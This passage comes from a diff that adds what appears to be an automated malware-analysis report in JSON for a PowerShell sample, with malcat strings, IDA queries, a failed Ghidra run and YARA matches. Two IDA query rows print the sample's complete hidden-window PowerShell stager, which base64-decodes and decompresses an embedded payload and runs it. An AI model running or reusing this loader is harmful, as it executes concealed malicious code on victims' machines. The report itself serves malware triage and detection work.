+            "summary": "JkW7RcEve6LTvO0R..MiTPy83oAY4JfhYp"
+          },
+          {
+            "ea": 511,
+            "summary": "2aOMhRxfK28a3K18..rjhpv3sB8jQ64Xzj"
+          },
+          {
+            "ea": 483,
+            "summary": "1HVVXXqdHVv97FXkCTmQoNyv797"
+          },
+          {
+            "ea": 1741,
+            "summary": "UHz3R3ZHxwY5Hh0k..JU96hldxPZFqKB04"
+          },
+          {
+            "ea": 881,
+            "summary": "4CWlvQHtOPaD257u..795uK5oQ7SVLoPfm"
+          },
+          {
+            "ea": 1129,
+            "summary": "JmRhR7Dc5Mc7JdUncF8m5W"
+          },
+          {
+            "ea": 652,
+            "summary": "7fdx5ayuc9ojlfN8..Lp7Te4P5sMINWmWK"
+          },
+          {
+            "ea": 2074,
+            "summary": "IDsion4QRXMVBygw..hhaEOO1Cli8oxT7A"
+          },
+          {
+            "ea": 260,
+            "summary": "StreamReader"
+          },
+          {
+            "ea": 558,
+            "summary": "fhzuswzHxWXcusOFmOc42lCCc77B"
+          },
+          {
+            "ea": 2553,
+            "summary": "hPfju7f8AKrkmBB0MAAA"
+          },
+          {
+            "ea": 2529,
+            "summary": "KjBcPP5YRyPv22tirfbYv3k"
+          },
+          {
+            "ea": 150,
+            "summary": "ProcessStartInfo"
+          },
+          {
+            "ea": 2603,
+            "summary": "CompressionMode"
+          },
+          {
+            "ea": 2653,
+            "summary": "UseShellExecute"
+          },
+          {
+            "ea": 52,
+            "summary": "WindowsPowerShell"
+          },
+          {
+            "ea": 2129,
+            "summary": "bH1z1MLK3pr6ViKTDmYgGxlzs9MVK"
+          },
+          {
+            "ea": 339,
+            "summary": "MemoryStream"
+          },
+          {
+            "ea": 1153,
+            "summary": "irr6nBfFQXlTbPTQqHK"
+          },
+          {
+            "ea": 390,
+            "summary": "H4sIAAKbYF0CA7VWa4"
+          },
+          {
+            "ea": 2262,
+            "summary": "LU1Xn65QIK0ZBrcTlzhPbecnVh"
+          },
+          {
+            "ea": 2289,
+            "summary": "gQNQ"
+          },
+          {
+            "ea": 2503,
+            "summary": "CFAfzRuF5ECBE24Yii"
+          },
+          {
+            "ea": 91,
+            "summary": "else"
+          },
+          {
+            "ea": 1728,
+            "summary": "XHxWnyqBynZr"
+          },
+          {
+            "ea": 2250,
+            "summary": "Mo7IwddEbwZ"
+          },
+          {
+            "ea": 294,
+            "summary": "Compression"
+          },
+          {
+            "ea": 2447,
+            "summary": "4xLtTc9791g9bIWfph"
+          },
+          {
+            "ea": 2591,
+            "summary": "Compression"
+          },
+          {
+            "ea": 138,
+            "summary": "Diagnostics"
+          },
+          {
+            "ea": 2621,
+            "summary": "Decompress"
+          },
+          {
+            "ea": 2735,
+            "summary": "CreateNoWindow"
+          },
+          {
+            "ea": 2767,
+            "summary": "Diagnostics"
+          },
+          {
+            "ea": 1552,
+            "summary": "n3R8ujJU71sRiqM1"
+          },
+          {
+            "ea": 2789,
+            "summary": "Start"
+          },
+          {
+            "ea": 4,
+            "summary": "IntPtr"
+          },
+          {
+            "ea": 231,
+            "summary": "create"
+          },
+          {
+            "ea": 2779,
+            "summary": "Process"
+          },
+          {
+            "ea": 2296,
+            "summary": "YMX5z7b93TOsryEFGoB3AFV"
+          },
+          {
+            "ea": 33,
+            "summary": "windir"
+          },
+          {
+            "ea": 2724,
+            "summary": "Hidden"
+          },
+          {
+            "ea": 204,
+            "summary": "hidden"
+          },
+          {
+            "ea": 587,
+            "summary": "cG5Ic7w"
+          },
+          {
+            "ea": 2469,
+            "summary": "idS3SIXz8f8bry9w"
+          },
+          {
+            "ea": 217,
+            "summary": "scriptblock"
+          },
+          {
+            "ea": 170,
+            "summary": "FileName"
+          },
+          {
+            "ea": 2117,
+            "summary": "5Gx9vtUIKw5"
+          },
+          {
+            "ea": 2635,
+            "summary": "ReadToEnd"
+          },
+          {
+            "ea": 371,
+            "summary": "FromBase64String"
+          },
+          {
+            "ea": 42,
+            "summary": "sysnative"
+          },
+          {
+            "ea": 546,
+            "summary": "XkxTOYkQiR8"
+          },
+          {
+            "ea": 595,
+            "summary": "9nmEXsF9ztX"
+          },
+          {
+            "ea": 867,
+            "summary": "CpKPfH3FF"
+          },
+          {
+            "ea": 757,
+            "summary": "PcJ7Xm9w92"
+          },
+          {
+            "ea": 2486,
+            "summary": "rH4XhkLzEu9X03"
+          },
+          {
+            "ea": 445,
+            "summary": "B2dGqsRu7h"
+          },
+          {
+            "ea": 464,
+            "summary": "vfbzXgyexmskpWui2Q"
+          },
+          {
+            "ea": 185,
+            "summary": "Arguments"
+          },
+          {
+            "ea": 2711,
+            "summary": "WindowStyle"
+          },
+          {
+            "ea": 277,
+            "summary": "Object"
+          },
+          {
+            "ea": 2670,
+            "summary": "false"
+          },
+          {
+            "ea": 2522,
+            "summary": "PG9eC"
+          },
+          {
+            "ea": 2760,
+            "summary": "System"
+          },
+          {
+            "ea": 2581,
+            "summary": "System"
+          },
+          {
+            "ea": 131,
+            "summary": "System"
+          },
+          {
+            "ea": 124,
+            "summary": "Object"
+          },
+          {
+            "ea": 2441,
+            "summary": "3arKb"
+          },
+          {
+            "ea": 737,
+            "summary": "FHETD1C"
+          },
+          {
+            "ea": 690,
+            "summary": "rhMvS"
+          },
+          {
+            "ea": 1829,
+            "summary": "yJDIb"
+          },
+          {
+            "ea": 1839,
+            "summary": "T1np5e"
+          },
+          {
+            "ea": 456,
+            "summary": "Yjthkwu"
+          },
+          {
+            "ea": 361,
+            "summary": "Convert"
+          },
+          {
+            "ea": 354,
+            "summary": "System"
+          },
+          {
+            "ea": 329,
+            "summary": "System"
+          },
+          {
+            "ea": 322,
+            "summary": "Object"
+          },
+          {
+            "ea": 284,
+            "summary": "System"
+          },
+          {
+            "ea": 250,
+            "summary": "System"
+          },
+          {
+            "ea": 243,
+            "summary": "Object"
+          },
+          {
+            "ea": 1115,
+            "summary": "pCiPG9y8z0cNK"
+          },
+          {
+            "ea": 2703,
+            "summary": "true"
+          },
+          {
+            "ea": 2751,
+            "summary": "true"
+          },
+          {
+            "ea": 1374,
+            "summary": "qa0Q"
+          },
+          {
+            "ea": 745,
+            "summary": "LfB268yzxRN"
+          },
+          {
+            "ea": 306,
+            "summary": "GzipStream"
+          },
+          {
+            "ea": 915,
+            "summary": "tzH4Bk"
+          },
+          {
+            "ea": 1569,
+            "summary": "tdNWz"
+          },
+          {
+            "ea": 13,
+            "summary": "Size"
+          }
+        ],
+        "imports": [],
+        "sections": [
+          {
+            "name": "",
+            "effective_address": 0,
+            "physical_size": 2800,
+            "virtual_size": 2800,
+            "rights": "",
+            "entropy": 148
+          }
+        ],
+        "entropy": {
+          "file_entropy": 148,
+          "regions": [
+            {
+              "name": "",
+              "entropy": 148,
+              "size": null
+            }
+          ]
+        },
+        "functions": [],
+        "constants": [],
+        "carved": [],
+        "virtual_files": [],
+        "structures": []
+      },
+      "functions": [],
+      "constants": [],
+      "anomalies": [],
+      "carved_files": [],
+      "virtual_files": [],
+      "structures": [],
+      "decompilations": {},
+      "script_decompile": null,
+      "unpack_result": null,
+      "errors": []
+    },
+    "lg_ida_query_9": {
+      "columns": [
+        "content",
+        "address",
+        "length"
+      ],
+      "rows": [
+        {
+          "content": "if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''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''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\n",
+          "address": "0",
+          "length": "2800"
+        }
+      ],
+      "row_count": 1,
+      "total_row_count": 1,
+      "truncated": false,
+      "source": "ida_query",
+      "session_id": "ida-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+      "audit_path": "/opt/samples/logs/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/audit.jsonl"
+    },
+    "lg_ghidra_query_10": {
+      "error": "ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n"
+    },
+    "lg_ida_query_11": {
+      "columns": [
+        "content"
+      ],
+      "rows": [
+        {
+          "content": "if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''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''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\n"
+        }
+      ],
+      "row_count": 1,
+      "total_row_count": 1,
+      "truncated": false,
+      "source": "ida_query",
+      "session_id": "ida-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+      "audit_path": "/opt/samples/logs/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/audit.jsonl"
+    },
+    "lg_yara_scan_12": {
+      "rule_count": 5,
+      "matches": [
+        {
+          "rule": "domain",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": [
+            {
+              "id": "$domain_regex",
+              "offset": 0,
+              "length": 2,
+              "xor_key": null
+            }
+          ]
+        },
+        {
+          "rule": "powershell",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": [
+            {
+              "id": "$a",
+              "offset": 59,
+              "length": 10,
+              "xor_key": null
+            }
+          ]
+        },
+        {
+          "rule": "IP",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": [
+            {
+              "id": "$ipv6",
+              "offset": 11,
+              "length": 2,
+              "xor_key": null
+            }
+          ]
+        },
+        {
+          "rule": "contains_base64",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": [
+            {
+              "id": "$a",
+              "offset": 52,
+              "length": 16,
+              "xor_key": null
+            }
+          ]
+        },
+        {
+          "rule": "Antivirus",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": []
+        }
+      ],
+      "engine": "yara-x",
+      "rules_compiled": 454,
+      "compile_errors": [
+        "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
+        "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_pornClicker.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_pornClicker.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_Spywaller.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Spywaller.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_OmniRat.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_OmniRat.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Wshell_ChineseSpam.yar: error[E014]: invalid regular expression\n  --> /opt/samples/rules/flat/Wshell_ChineseSpam.yar:17:42\n   |\n17 |         $c = /if ?\\(\\$_POST\\[Submit\\]\\) ?{/\n   |                                          ^ unclosed counted repetition\n   |\n   = note: did you mean `\\{` instead of `{`?",
+        "/opt/samples/rules/flat/Android_FakeBank_Fanta.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_FakeBank_Fanta.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_AliPay_smsStealer.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_AliPay_smsStealer.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found"
+      ],
+      "incomplete": true
+    }
+  },
+  "intake_validation": {
+    "sha256": "14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+    "tool_summaries": {
+      "malcat": {
+        "type": "text/utf8",
+        "arch": "NONE",
+        "file_size": 2800,
+        "entropy": 148,
+        "sha256": "14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+        "dotnet_bundle": false,
+        "imports_count": 0,
+        "strings_count": 100,
+        "functions_count": 0,
+        "constants_count": 0,
+        "anomalies_count": 0,
+        "yara_hits_count": 2,
+        "errors": []
+      },
+      "ghidra": {},
+      "ida": {
+        "imports": 0,
+        "funcs": 0,
+        "strings": 1
+      }
+    },
+    "warnings": [
+      "Ghidra validation failed: ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n"
+    ],
+    "source_decisions": {
+      "sha256": "14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+      "imports": {
+        "source": "none",
+        "confidence": "high",
+        "reason": "Evidence: {malcat, summary, imports_count: 0, indicates no imports}; {ida, summary, imports: 0, confirms zero imports}; {ghidra, failure warning, server died, no data available}."
+      },
+      "functions": {
+        "source": "none",
+        "confidence": "high",
+        "reason": "Evidence: {malcat, summary, functions_count: 0, shows no functions}; {ida, summary, funcs: 0, confirms zero functions}; {ghidra, failure warning, server died, no data available}."
+      },
+      "strings": {
+        "source": "both",
+        "confidence": "high",
+        "reason": "Evidence: {malcat, summary, strings_count: 100, provides extensive string list}; {ida, summary, strings: 1, adds additional strings}; combining both engines ensures comprehensive coverage."
+      },
+      "decompilation": {
+        "source": "none",
+        "confidence": "high",
+        "reason": "Evidence: {malcat, summary, functions_count: 0, no functions to decompile}; {ida, summary, funcs: 0, no functions detected}; {ghidra, failure warning, server died, cannot perform decompilation}."
+      },
+      "cff": {
+        "source": "none",
+        "confidence": "high",
+        "reason": "Evidence: {malcat, summary, functions_count: 0, no control flow data}; {ida, summary, funcs: 0, no function coverage}; {ghidra, failure warning, server died, unreliable coverage}."
+      },
+      "static_profile": {
+        "source": "malcat",
+        "confidence": "high",
+        "reason": "Evidence: {malcat, summary, provides file type, arch, entropy, anomalies, imports, strings, and yara hits for quick analysis}; {ghidra, failure warning, no data}; {ida, summary, limited to minimal counts}."
+      },
+      "llm_revised": true
+    }
+  },
+  "redundant_calls": 0,
+  "failure_taxonomy": {
+    "counts": {
+      "json_format_violation": 0,
+      "tool_misuse": 0,
+      "early_termination": 0,
+      "api_hallucination": 0,
+      "byte_level_reasoning": 0,
+      "control_flow_misinterpretation": 0
+    },
+    "active": {},
+    "primary": null,
+    "clean": true
+  },
+  "cff_results": {
+    "tool": "cff_deflatten",
+    "claim_type": "cff_dispatcher",
+    "result": "untested",
+    "duration_s": 5.793571472167969e-05,
+    "evidence": "cff_deflatten.py not found at /opt/cadre-v3-tools/cff-deflatten/cff_deflatten.py; copy from v3-deploy/cff-deflatten/",
+    "raw": {}
+  }
+}
